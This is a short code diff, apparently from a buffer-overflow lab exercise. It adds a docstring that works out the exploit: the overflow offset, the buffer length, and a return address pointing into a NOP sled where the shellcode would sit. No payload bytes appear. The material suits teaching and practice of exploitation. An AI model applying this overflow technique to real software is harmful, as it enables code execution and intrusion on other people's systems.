@@ -1,6 +1,17 @@
 import struct 
 import sys
 
+""" 
+Calculations: 
+
+offset = 505 bytes
+overflow_len = 505 - 128 - 25 = 352 bytes
+return_addr = buf_addr + 60 = 0xffffcd63 + 60 = 0xffffcd9f 
+
+return_addr is the start of the NOP sled
+Shellcode is 60 bytes into the NOP sled so we get it
+This is inside the NOP sled
+"""
 your_buffer =  ""
 
 eip_addr = 0xffffcf5c
